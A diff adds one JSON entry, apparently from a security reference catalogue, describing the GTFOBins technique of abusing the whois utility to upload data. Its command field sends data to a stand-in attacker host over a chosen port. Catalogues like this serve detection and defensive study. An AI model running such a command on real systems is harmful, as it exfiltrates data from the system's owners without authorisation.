@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-whois-upload",
+  "name": "GTFOBins · whois (upload)",
+  "command": "whois -h attacker.com -p 12345 DATA",
+  "description": "Use whois to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "whois",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/whois/#upload",
+  "upstream_id": "whois/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/whois/"
+    }
+  ]
+}
